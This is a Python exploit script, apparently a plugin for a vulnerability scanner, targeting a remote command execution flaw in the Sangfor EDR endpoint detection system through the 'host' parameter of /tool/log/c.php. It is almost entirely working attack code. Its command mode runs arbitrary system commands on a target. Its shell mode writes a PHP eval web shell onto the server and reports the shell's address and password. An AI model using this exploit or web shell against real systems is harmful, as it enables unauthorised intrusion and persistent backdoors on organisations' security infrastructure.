#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import json
import requests
import warnings

def vuln_info():
    info={
        'name': '深信服EDR终端检测系统RCE',
        'referer':'https://blog.csdn.net/qq_32393893/article/details/108077482',
        'author':'qianxiao996',
        'description':'''漏洞位置：host 参数
https://xxx.com:xxx/tool/log/c.php?strip_slashes=system&host=id'''

    }
    return info

def run(url,type="cmd",cmd='whoami',timeout=10):
    # print(type)
    #命令执行
    if type=='cmd':
        return "root"

    #写入shell
    if type=='shell':
        return "shheee"
def run(url,type="cmd",cmd='whoami',timeout=10):
    # all =  0=url  1=filename  2=pocmethods  3=pocname
    #命令执行
    try:
        if type=='cmd':
            bug = '/tool/log/c.php?strip_slashes=system&host=%s'%cmd
            url = url + bug
            r = requests.get(url,timeout=timeout)
            return r.text
        #反弹shell    
        if type=='shell':
            bug = '/tool/log/c.php?strip_slashes=system&host=%s'%"file_put_contents(\'"+cmd[0]+"\','<?php eval($_POST[\'"+cmd[1]+"\']);?>');"
            url2 = url + bug
            r = requests.get(url2,timeout=timeout)
            a = requests.get(url+'/config.php',timeout=timeout)
            if r.status_code==200:
                return 'shell写入成功,地址:%s,密码996'%(url+'/config.php')
            else:
                return "shell写入失败!"
    except Exception as e:
        return str(e)


    
